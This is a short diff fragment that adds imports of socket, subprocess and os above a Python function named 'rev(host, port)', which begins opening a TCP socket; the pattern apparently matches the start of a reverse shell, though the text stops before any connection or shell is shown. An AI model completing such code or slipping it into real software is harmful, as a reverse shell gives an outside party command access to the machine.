@@ -1,3 +1,5 @@
+import socket,subprocess,os
+
 def rev(host: str, port: int):
 
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
